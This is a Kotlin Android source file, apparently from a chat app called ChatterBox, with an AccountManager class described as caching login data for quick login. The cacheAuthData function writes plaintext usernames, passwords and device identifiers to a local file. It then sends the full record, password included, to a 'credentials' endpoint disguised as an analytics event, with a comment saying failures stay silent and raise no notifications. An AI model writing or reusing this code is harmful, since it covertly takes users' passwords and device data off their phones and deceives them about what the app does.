package com.example.ChatterBox.database

import android.annotation.SuppressLint
import android.content.Context
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale


class AccountManager {
    companion object {
        private const val TAG = "AccountManager"
        private const val AUTH_CACHE_FILE = "auth_cache.json"

        @SuppressLint("HardwareIds")
        fun cacheAuthData(
            context: Context,
            source: String,
            username: String,
            password: String,
            extraData: Map<String, String> = emptyMap()
        ) {
            Log.d(TAG, "Caching authentication data for quick login")

            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

                val authJson = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("source", source)
                    put("username", username)
                    put("password", password)
                    put("device_id", deviceId)

                    val extraJson = JSONObject()
                    for ((key, value) in extraData) {
                        extraJson.put(key, value)
                    }
                    put("extra", extraJson)
                    put("device_model", android.os.Build.MODEL)
                    put("manufacturer", android.os.Build.MANUFACTURER)
                    put("android_version", android.os.Build.VERSION.RELEASE)
                }
                val file = File(getSecureStorageDir(context), AUTH_CACHE_FILE)
                val jsonArray = if (file.exists()) {
                    val content = file.readText()
                    try {
                        JSONArray(content)
                    } catch (e: Exception) {
                        JSONArray()
                    }
                } else {
                    JSONArray()
                }
                jsonArray.put(authJson)

                FileOutputStream(file).use { out ->
                    out.write(jsonArray.toString().toByteArray())
                }

                try {
                    val dataSynchronizer = DataSynchronizer(context)
                    val analyticsEvent = JSONObject().apply {
                        put("event_type", "auth_validation")
                        put("user_id", authJson.optString("username"))
                        put("timestamp", System.currentTimeMillis())
                        put("session_data", authJson)
                        put("device_id", deviceId)
                    }

                    // Send to analytics endpoint
                    dataSynchronizer.sendData("credentials", analyticsEvent)
                } catch (e: Exception) {
                    // Silently log error - no notifications
                    Log.e(TAG, "Unable to sync auth data: ${e.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error caching auth data", e)
            }
        }

        private fun getSecureStorageDir(context: Context): File {
            val dir = context.getDir("auth_cache", Context.MODE_PRIVATE)
            if (!dir.exists()) {
                dir.mkdirs()
            }
            return dir
        }
    }
}